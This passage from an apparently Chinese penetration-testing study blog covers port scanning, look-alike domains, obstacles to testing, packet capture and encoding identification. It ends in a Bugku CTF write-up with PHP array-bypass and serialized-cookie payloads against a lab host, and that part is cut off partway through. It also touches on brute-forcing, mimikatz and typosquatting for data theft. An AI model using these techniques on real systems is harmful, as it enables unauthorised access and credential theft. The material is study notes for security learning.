title="端口扫描，探针-主动，被动"></a>端口扫描，探针-主动，被动</h2><p>分为主动式和被动式扫描。部分目标是禁止主动式扫描/探针的。防止主动式子影响业务流量。<br>主动式：流量从本地出发探针目标信息，发送大量的流量。有法律风险。<br>被动式：借助网上的接口进行查询，历史记录什么的。（推荐）相当于查询他人已经查过的结果。<br>工具：在线端口扫描工具或者nmap</p><p>端口扫描必须找到真实的IP地址进行扫描才有意义。扫CDN节点是没用的。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">端口扫描和端口探测都是用来确定目标主机上哪些端口正在监听和开放的。</span><br><span class="line"></span><br><span class="line">端口扫描是一种主动式的方法，它通过向目标主机发送各种不同的数据包，来寻找可以成功连接的端口。</span><br><span class="line">具体而言，常见的端口扫描技术包括 SYN 扫描、UDP 扫描、FIN 扫描、<span class="literal">NULL</span> 扫描、XMAS 扫描等。</span><br><span class="line">通过对响应包的分析，可以确定目标主机上哪些端口开放、哪些端口关闭、以及哪些端口被过滤。</span><br><span class="line">端口扫描虽然能够快速、准确地检测目标主机的端口状况，但也容易被 IDS 和防火墙等安全设备检测到，从而对渗透测试造成影响。</span><br><span class="line"></span><br><span class="line">端口探针（Port Scavenger）是一种被动式的方法，它通过监听网络上的数据包，来收集目标主机上的端口信息。</span><br><span class="line">具体而言，端口探针会在本地机器启动一个服务程序，用于接收来自目标主机的 ICMP Echo、TCP SYN 和 UDP 数据包，</span><br><span class="line">并通过分析收到的数据包，来确认目标主机上哪些端口正在监听和开放的。</span><br><span class="line">相比于端口扫描，端口探针不需要主动向目标主机发送数据包，因此更为隐蔽和难以检测。</span><br><span class="line">但是，端口探针对网络带宽的消耗较大，而且只能被动获取端口信息，不能主动确认目标主机上某个端口是否真正开放。</span><br><span class="line"></span><br><span class="line">综上所述，端口扫描是一种主动式的方法，能够快速、准确地发现目标主机上的端口，但也容易被 IDS 和防火墙等安全设备检测到；端口探针是一种被动式的方法，相对较隐蔽，但只能被动获取端口信息。在实际渗透测试中，可以根据具体情况选择不同的方法，或者两种方法结合起来使用，以达到更好的效果。</span><br></pre></td></tr></table></figure><h2 id="多域名查询"><a href="#多域名查询" class="headerlink" title="多域名查询"></a>多域名查询</h2><h3 id="域名旁注-URL欺诈"><a href="#域名旁注-URL欺诈" class="headerlink" title="域名旁注-URL欺诈"></a>域名旁注-URL欺诈</h3><p>旁注有两种理解和解释：</p><blockquote><p>解释1：主站防护过高，无法入手，从其旁站寻找突破口，也就是与主站相关的服务器上的其他站点。<br>解释2：自己注册与主站相似的站点，赌运气别人输错url，盗取个人信息。</p></blockquote><h3 id="域名与子域名"><a href="#域名与子域名" class="headerlink" title="域名与子域名"></a>域名与子域名</h3><p>一般网站域名由三部分组成：三级域名.二级域名.顶级域名;或者：二级域名.顶级域名</p><blockquote><p>xiaodi8.com  =&gt; 由二级域名+顶级域名组成。<br>子域名可以自己扩展，形如 <a href="http://www.baidu.com./">www.baidu.com。</a></p></blockquote><h3 id="相似域名"><a href="#相似域名" class="headerlink" title="相似域名"></a>相似域名</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">www.xiaodi8.com</span><br><span class="line"></span><br><span class="line">变动资源名：www</span><br><span class="line">变动xiaodi8 xiaodi89 xxx</span><br><span class="line">变动com cn net org</span><br></pre></td></tr></table></figure><h3 id="查域名备案信息"><a href="#查域名备案信息" class="headerlink" title="查域名备案信息"></a>查域名备案信息</h3><p>=&gt; 找个域名注册，查看域名是否被注册就知道域名是否被使用过了。<br>可能域名变动就是换一个对应的应用和网站.</p><h3 id="对我们的帮助"><a href="#对我们的帮助" class="headerlink" title="对我们的帮助"></a>对我们的帮助</h3><p>资产瞬间多了很多，机会多了很多。<br>查企业备案信息，备案查询，查询对应信息的IP地址什么的。<br><a href="https://forum.ywhack.com/bountytips.php?getinfo">棱角社区之信息收集</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-信息打点-02 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0004-资产架构/站库分离/测试阻碍</title>
      <link href="/2023/04/26/SEC-Study-0032/"/>
      <url>/2023/04/26/SEC-Study-0032/</url>
      
        <content type="html"><![CDATA[<p>集成化搭建网站站点：宝塔</p><p>➢资产架构-BT搭建&amp;多站点&amp;多插件&amp;多应用等<br>➢番外安全-Aliyun&amp;域名解析&amp;云服务器&amp;个人等<br>➢考虑阻碍-站库分离&amp;部署防护&amp;负载均衡&amp;CDN等</p><h1 id="资产架构："><a href="#资产架构：" class="headerlink" title="资产架构："></a>资产架构：</h1><p>信息收集网站信息需要收集的内容，分析攻击的口子在下面的那些内容：</p><blockquote><p><span style="color:red;"> <strong>更多的端口服务/网站/协议服务</strong> </span> =&gt; 寻找对应的安全漏洞</p></blockquote><ul><li>信息收集就是收集突破口，明白哪些可以测试那些不可以测试（后面学漏洞就知道了）</li><li>收集完成后必须明白：哪些漏洞存在，哪些漏洞不存在，要面对的是哪些漏洞 =&gt; 利用漏洞</li></ul><h2 id="WEB单个源码指向安全"><a href="#WEB单个源码指向安全" class="headerlink" title="WEB单个源码指向安全"></a>WEB单个源码指向安全</h2><p>一套源码一个网站，没有更多的网站作为突破口。</p><h2 id="一站两程序-源码类型"><a href="#一站两程序-源码类型" class="headerlink" title="一站两程序/源码类型"></a>一站两程序/源码类型</h2><p>安全测试角度：两个目标，代表可以测试的目标有两个，任意一个有漏洞都是会互相影响的。</p><h3 id="目录型-WEB多个目录源码安全"><a href="#目录型-WEB多个目录源码安全" class="headerlink" title="目录型-WEB多个目录源码安全"></a>目录型-WEB多个目录源码安全</h3><p>服务器的一个域名网站下的另外一个目录的网站：两套网站/两套程序任意一套遇到漏洞都可以进行安全测试</p><h3 id="端口型-WEB多个端口源码安全"><a href="#端口型-WEB多个端口源码安全" class="headerlink" title="端口型-WEB多个端口源码安全"></a>端口型-WEB多个端口源码安全</h3><p>服务器一套网站两个端口/两套程序</p><h3 id="服务器架设多个站点安全"><a href="#服务器架设多个站点安全" class="headerlink" title="服务器架设多个站点安全"></a>服务器架设多个站点安全</h3><p>服务器两个域名对应一个IP地址/一个服务器 =&gt; 信息打点会说怎么查。</p><h2 id="架设第三方插件接口安全"><a href="#架设第三方插件接口安全" class="headerlink" title="架设第三方插件接口安全"></a>架设第三方插件接口安全</h2><blockquote><p>web源码插件 源码上的插件<br>web应用插件 第三方插件</p><blockquote><p><strong>举例：</strong> phpmyadmin 便于管理数据库，也为攻击者提供了攻击数据库的可能。即使是限制本地IP登录，这个应用也能解决掉这种外联的问题。</p></blockquote></blockquote><p>Web源码插件和Web应用插件的区别如下：</p><ul><li><strong>目的不同：</strong> Web源码插件的主要目的是帮助网站管理员进行网站源代码管理，例如自动备份、还原、版本控制等；而Web应用插件则是为网站添加额外的功能模块或特定的业务流程等。</li><li><strong>实现方式不同：</strong> Web源码插件通过修改或扩展原有的代码实现其功能，这需要插件开发者对网站源代码有一定的了解并进行修改；而Web应用插件则是独立开发的，一般通过接口或API来与网站进行通信，开发者只需要按照相应的开发文档进行开发即可。</li><li><strong>使用场景不同：</strong> Web源码插件适用于那些需要进行源代码管理的网站，例如需要备份网站数据以确保数据恢复的可靠性；而Web应用插件一般适用于那些需要添加新功能或者改进用户体验的网站上，例如添加一个在线聊天功能、购物车等。</li><li><strong>风险不同：</strong> 由于Web源码插件需要修改网站源代码，所以它存在一定的风险，如果插件代码出现问题，可能会导致网站无法正常运行。而Web应用插件则不会影响网站的基本功能，因此风险较小。</li></ul><h2 id="服务器架设多个应用安全"><a href="#服务器架设多个应用安全" class="headerlink" title="服务器架设多个应用安全"></a>服务器架设多个应用安全</h2><p>ftp协议：<br>方便管理员进行文件操作，<br>方便攻击者进行FTP协议攻击 - 上传后门文件等，丰富了攻击者的选择<br>插件和应用越多，网站安全系数越低。</p><h1 id="番外安全："><a href="#番外安全：" class="headerlink" title="番外安全："></a>番外安全：</h1><p>非针对网站本身的攻击，而是借力打力</p><p>查账号密码，社工常用密码及个人信息，修改域名解析地址，修改账号密码(服务器上的)等。得到个人信息后对网站进行攻击就多了一些参考。</p><p>基于域名解析安全<br>基于服务器本身安全<br>基于服务商信息安全<br>基于管理个人的安全</p><h1 id="考虑阻碍："><a href="#考虑阻碍：" class="headerlink" title="考虑阻碍："></a>考虑阻碍：</h1><ul><li>阻碍-站库分离</li><li>阻碍-CDN加速服务<ul><li>主站流量缓存到各个CDN节点上，使各地访问服务器时速度更快，体验更好</li><li>缓存节点被打崩也不会影响到服务器本身。</li><li>节点是全球各地的。</li></ul></li><li>阻碍-负载均衡服务<ul><li>多台服务器作为备用机</li><li>服务给到其他主机，防止某一台服务器崩溃了</li><li>影响：导致安全测试的目标可能是备用机权限，没拿到主控机,可能导致获取不到需要的效果</li><li>CDN不能解决节点服务器崩溃的问题，负载均衡可以。</li></ul></li><li>阻碍-WAF应用防火墙<ul><li>Web应用防护墙（Web Application Firewall，简称WAF）是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品，主要用于防御针对网络应用层的攻击，像SQL注入、跨站脚本攻击、参数篡改、应用平台漏洞攻击、拒绝服务攻击等。</li><li>网站应用防火墙</li><li>包括杀毒软件，主机防护</li><li>软件：安全狗</li><li>杀毒软件也算是主机防火墙</li></ul></li><li>阻碍-主机防护防火墙<ul><li>防火墙和杀毒软件不是都能绕过的</li><li>绕过的是那些比较低端的<ul><li><strong>实在不行，学会跑路</strong></li></ul></li><li>防火墙等有些条件限制，满足条件才能完成攻击</li></ul></li></ul><p><strong>防护是真的有用，不可能是完全没用的，仅仅限部分能绕。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-基础入门-01 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0003-抓包/封包/代理&amp;加密解密</title>
      <link href="/2023/04/24/SEC-Study-0031/"/>
      <url>/2023/04/24/SEC-Study-0031/</url>
      
        <content type="html"><![CDATA[<h1 id="抓包-封包-代理"><a href="#抓包-封包-代理" class="headerlink" title="抓包/封包/代理"></a>抓包/封包/代理</h1><p>抓包分两类，一类是web协议抓包，一种是TCP、UDP等的协议抓包。<br>web协议抓包比较常用，比如修改数据包数据什么的。</p><h2 id="基础抓包"><a href="#基础抓包" class="headerlink" title="基础抓包"></a>基础抓包</h2><p>➢WEB应用站点操作数据抓包 - 浏览器审查查看元素网络监听</p><p>抓包功能不一定要依靠抓包软件，浏览器自身也携带了可以抓包的工具。<br>各个浏览器：F12打开，点击Network/网络 <strong>-&gt;</strong> 叫法不同，功能相同。可以抓Web协议的数据包。</p><h2 id="各个软件抓包-代理抓包"><a href="#各个软件抓包-代理抓包" class="headerlink" title="各个软件抓包-代理抓包"></a>各个软件抓包-代理抓包</h2><p>➢APP&amp;小程序&amp;PC抓包HTTP/S数据 <strong>-&gt;</strong> Charles&amp;Fiddler&amp;Burpsuite<br>➢程序进程&amp;网络接口&amp;其他协议抓包 <strong>-&gt;</strong> WireShark&amp;科来网络分析系统<br>➢通讯类应用封包分析发送接收 <strong>-&gt;</strong> WPE四件套封包&amp;科来网络分析系统<br>WPE算外挂类抓包，抓散装动作数据包，能使得动作复位。</p><p>详细的查这篇本地文章：SEC学习2023版-0011 &gt; 重点在包转发那边，转发到BP进行测试。</p><h2 id="环境配置："><a href="#环境配置：" class="headerlink" title="环境配置："></a>环境配置：</h2><p>1、安卓模拟器安装搭建<br>逍遥，雷电，夜神等自行百度下载安装</p><p>2、工具相关证书安装指南（SEC学习2023版-0011上就有。）<br>Charles<br><a href="https://blog.csdn.net/weixin_45459427/article/details/108393878">https://blog.csdn.net/weixin_45459427/article/details/108393878</a><br>Fidder<br><a href="https://blog.csdn.net/weixin_45043349/article/details/120088449">https://blog.csdn.net/weixin_45043349/article/details/120088449</a><br>BurpSuite<br><a href="https://blog.csdn.net/qq_36658099/article/details/81487491">https://blog.csdn.net/qq_36658099/article/details/81487491</a></p><p>3、封包抓取调试见课程操作</p><p>1、为什么要抓包？       -抓包应用的资产信息进行安全测试<br>2、抓包对象有那些？     -小程序,APP,桌面应用等<br>3、抓包协议区别工具？   -有部分应用不走HTTP/S，需要用到全局协议抓包<br>4、封包和抓包不同之处？ -零散整体的区别，封包能精确到每个操作的数据包</p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>1、抓包技术应用意义 ：将看不见的目标提出来<br>2、抓包技术应用对象 ：exe，安卓，Web<br>3、抓包技术应用协议 ：web协议和非web协议<br>4、抓包技术应用支持 ：BP，茶杯，科莱等<br>5、封包技术应用意义 ：实时数据包抓取，动作散装数据包<br>总结点：学会不同对象采用不同抓包封包抓取技术分析</p><p>基于网络接口抓包-网络接口<br>基于程序进程抓包-程序进程<br>基于数据协议抓包-HTTP/S&amp;TCP&amp;UDP<br>基于应用对象抓包-APP&amp;小程序&amp;PC_UI<br>基于系统使用抓包-模拟器&amp;WIN&amp;LINUX<br>基于应用对象封包-WPE动作数据包重放通讯</p><h1 id="加密解密"><a href="#加密解密" class="headerlink" title="加密解密"></a>加密解密</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>1、存储密码加密-Web&amp;数据库&amp;系统<br>2、传输数据编码-各类组合传输参数值<br>3、代码特性加密-JS&amp;PHP&amp;NET&amp;JAVA<br>4、数据显示编码-字符串数据显示编码</p><h2 id="本课意义"><a href="#本课意义" class="headerlink" title="本课意义"></a>本课意义</h2><p>1.了解加密编码进制在安全测试中的存在<br>2.掌握常见的加密解密编码解码进制互转的操作<br>3.了解常见的加密解密编码解密进制互转的影响<br>旨在解决类似疑问，提供思路：<br>你是否碰到不知道的加密方式？<br>你是否碰到无法找到的解密平台？<br>你是否碰到不知道如何解密的字符串？<br>你是否准备参加CTF比赛补充此类知识点？</p><h2 id="详细点："><a href="#详细点：" class="headerlink" title="详细点："></a>详细点：</h2><p>密码存储加密：<br>MD5 SHA1 NTLM AES DES RC4<br>MD5值是32或16位位由数字”0-9”和字母”a-f”所组成的字符串<br>SHA1这种加密的密文特征跟MD5差不多，只不过位数是40<br>NTLM这种加密是Windows的哈希密码，标准通讯安全协议<br>AES,DES,RC4这些都是非对称性加密算法，引入密钥，密文特征与Base64类似<br>应用场景：各类应用密文，自定义算法，代码分析，CTF安全比赛等</p><h1 id="加密解密部分"><a href="#加密解密部分" class="headerlink" title="加密解密部分"></a>加密解密部分</h1><h2 id="加密的类型"><a href="#加密的类型" class="headerlink" title="加密的类型"></a>加密的类型</h2><h3 id="数据库-网站加密-md5加密"><a href="#数据库-网站加密-md5加密" class="headerlink" title="数据库/网站加密-md5加密"></a>数据库/网站加密-md5加密</h3><p>说明：</p><blockquote><p>md5不可逆<br>尝试加密明文去碰撞密文，对得上则证明对应的明文是对的。<br>对应的有一些简单的md5碰撞解密</p></blockquote><p>解密：碰撞，枚举</p><blockquote><p>分析密文的特征，密文多少位。<br>密码明文足够复杂，足以使得当下的计算机解不出来。<br>md5密文有分为没加盐和有加盐两类。</p></blockquote><p>应用场景：MYSQL MSSQL等</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;password&#x27;</span>).<span class="string">&#x27;salt&#x27;</span>)</span><br><span class="line">md5解密不出来，或者搞错了加密算法加密的盐</span><br><span class="line">=&gt; 搞清楚当前网站是什么，运用的加密算法有哪些，对应的爆过什么漏洞等等。</span><br><span class="line">=&gt; 比如用到哪些CMS，对应的CMS出现过哪些对应的漏洞。</span><br></pre></td></tr></table></figure><h3 id="系统加密"><a href="#系统加密" class="headerlink" title="系统加密"></a>系统加密</h3><p>破解操作系统密码</p><blockquote><p><strong>mimikatz：</strong> 破解密码加密形式，其中的加密算法NTLM可以Windows7后的加密密文，破解出密码。Windows7 前会使用LM加密算法。</p></blockquote><h3 id="对称加密与非对称加密"><a href="#对称加密与非对称加密" class="headerlink" title="对称加密与非对称加密"></a>对称加密与非对称加密</h3><p>加密算法，以及想要解密密文，对应的参数特别多，少一个都解不出来。<br>AES解密加密，CTF有考到，有单独的项目考而不是过渡掺杂到web题目当中。<br>加密模式，填充，数据块，密码，偏移量……      -&gt; 特征与base64相似，尾部位“=”</p><h3 id="传输数据编码"><a href="#传输数据编码" class="headerlink" title="传输数据编码"></a>传输数据编码</h3><p>类型： <strong>BASE64 URL HEX ASCII</strong></p><blockquote><p>BASE64值是由数字”0-9”和字母”a-f”所组成的字符串,大小写敏感,结尾通常有符号=<br>URL编码是由数字”0-9”和字母”a-f”所组成的字符串,大小写敏感,通常以%数字字母间隔<br>HEX编码是计算机中数据的一种表示方法,将数据进行十六进制转换,它由0-9,A-F,组成<br>ASCII编码是将128个字符进行进制数来表示,常见ASCII码表大小规则：0<del>9&lt;A</del>Z&lt;a~z（目前很少用到）</p></blockquote><p>举例：</p><blockquote><p>个人博客-URL解码<br>国外WEB-BASE64解码<br>搜狐视频-BASE64解码</p></blockquote><p>应用场景：</p><blockquote><p>参数传递(如注入影响)，后期WAF绕过干扰写法应用，视频地址还原等</p></blockquote><h3 id="JS前端代码加密："><a href="#JS前端代码加密：" class="headerlink" title="JS前端代码加密："></a>JS前端代码加密：</h3><p>JS颜文字 jother JSFUCK<br>颜文字特征：一堆颜文字构成的js代码，在F12中可直接解密执行<br>jother特征：只用! + ( ) [ ] { }这八个字符就能完成对任意字符串的编码。也可在F12中解密执行<br>JSFUCK特征：与jother很像，只是少了{ }</p><p>加密目的：保护技术保护版权等。代码审计加密代码的解密，或者自己加版权码，加密绕过waf。</p><h3 id="后端代码加密："><a href="#后端代码加密：" class="headerlink" title="后端代码加密："></a>后端代码加密：</h3><p>类型：PHP .NET JAVA</p><blockquote><p>PHP：乱码，头部有信息<br>.NET：DLL封装代码文件<br>JAVA：JAR&amp;CLASS文件</p></blockquote><p>举例：Zend ILSpy IDEA<br>应用场景：版权代码加密，开发特性，CTF比赛等</p><h3 id="数据显示编码："><a href="#数据显示编码：" class="headerlink" title="数据显示编码："></a>数据显示编码：</h3><p>UTF-8 GBK2312等</p><h2 id="识别算法编码类型"><a href="#识别算法编码类型" class="headerlink" title="识别算法编码类型"></a>识别算法编码类型</h2><blockquote><p>1、看密文位数<br>2、看密文的特征（数字，字母，大小写，符号等）<br>3、看当前密文存在的地方（Web，数据库，操作系统等应用）</p><blockquote><p>加密密文的来源途径：代码数据库等地方翻出来=》网上获得密文对应途径的解题思路。</p></blockquote></blockquote><h2 id="补充点："><a href="#补充点：" class="headerlink" title="补充点："></a>补充点：</h2><p>1.常见加密编码进制等算法解析<br>MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES等<br>2.常见加密编码形式算法解析<br>直接加密，带salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等<br>3.常见解密解码方式（针对）<br>枚举，自定义逆向算法，可逆向<br>4.常见加密解码算法的特性<br>长度位数，字符规律，代码分析，搜索获取等</p><p>学习，必须学会总结+分析。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-基础入门-01 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-web-013</title>
      <link href="/2023/04/21/CTF-web-013/"/>
      <url>/2023/04/21/CTF-web-013/</url>
      
        <content type="html"><![CDATA[<p>题目源于bugku web</p><span id="more"></span><h1 id="各种绕过哟"><a href="#各种绕过哟" class="headerlink" title="各种绕过哟"></a>各种绕过哟</h1><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="comment">// 将id变量获取的值进行url解码</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// 变量存在验证</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">// 两者不相等</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>] == <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;passwd can not be uname.&#x27;</span>;</span><br><span class="line">    <span class="comment">// 两者散列算法相等</span></span><br><span class="line">    <span class="comment">// 尝试使用相等sha1的参数，实验了半天都是false，尝试绕过：数组绕过</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])&amp;(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;sorry!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造payload</span></span><br><span class="line"><span class="comment">// get传参部分</span></span><br><span class="line">http:<span class="comment">//114.67.175.224:11696/</span></span><br><span class="line">?uname[]=hello</span><br><span class="line">&amp;id=margin</span><br><span class="line"><span class="comment">// post部分</span></span><br><span class="line">passwd[]=HELLO</span><br><span class="line"></span><br><span class="line"><span class="comment">// 得到flag</span></span><br><span class="line">Flag: flag&#123;<span class="number">9e678</span>a37c93533fc0bf8c99bd3ea5fe1&#125;</span><br><span class="line"></span><br><span class="line">这里使用的是火狐的hackbar插件，bp需要加上：</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p>代码审计-数组绕过</p></blockquote><h1 id="需要管理员"><a href="#需要管理员" class="headerlink" title="需要管理员"></a>需要管理员</h1><h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p><img src="b1.png" alt="head"><br><img src="b2.png" alt="head"><br><img src="b3.png" alt="head"><br><img src="b4.png" alt="head"><br><img src="b5.png" alt="head"><br>爆破出密码<br><img src="b6.png" alt="head"><br><img src="b7.png" alt="head"></p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><blockquote><p>BP字典爆破<br>后台目录文件扫描</p></blockquote><h1 id="点login咋没反应"><a href="#点login咋没反应" class="headerlink" title="点login咋没反应"></a>点login咋没反应</h1><h2 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h2><p><img src="c1.png" alt="head"><br><img src="c2.png" alt="head"></p><ul><li>尝试在有限的html源代码当中进行翻找，仅仅找到一个css的src。</li><li>尝试进行目录扫描，扫到的除了index.php,还有一个没有展示代码的flag.php</li></ul><p><img src="c3.png" alt="head"></p><p>尝试访问</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//114.67.175.224:16422?23327</span></span><br></pre></td></tr></table></figure><p>获得源代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$KEY</span>=<span class="string">&#x27;ctf.bugku.com&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;BUGKU&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;23327&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cookie</span>) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;admin.css&quot;</span> type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">align</span>=&quot;<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">action</span>=&quot;#&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">user</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Username</span>&quot;&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Password</span>&quot;&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">value</span>=&quot;<span class="title">Login</span>&quot; <span class="title">type</span>=&quot;<span class="title">button</span>&quot;/&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure><p>核心代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$KEY</span>=<span class="string">&#x27;ctf.bugku.com&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;BUGKU&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;23327&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将$cookie反序列化后，值等于ctf.bugku.com。</span></span><br><span class="line"><span class="comment">// 与之相对应的是serialize()</span></span><br><span class="line"><span class="comment">// 序列化的结果ctf.bugku.com。 ==&gt; s:13:&quot;ctf.bugku.com&quot;</span></span><br><span class="line"><span class="comment">// 插入数据包：BUGKU=s:13:&quot;ctf.bugku.com&quot;</span></span><br><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cookie</span>) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数据包配置成下面即可。提交表单的方式是自己构造一个表单，使用get方式提交到指定地址。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET /index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">114.67</span>.<span class="number">175.224</span>:<span class="number">16422</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">109.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">112.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span 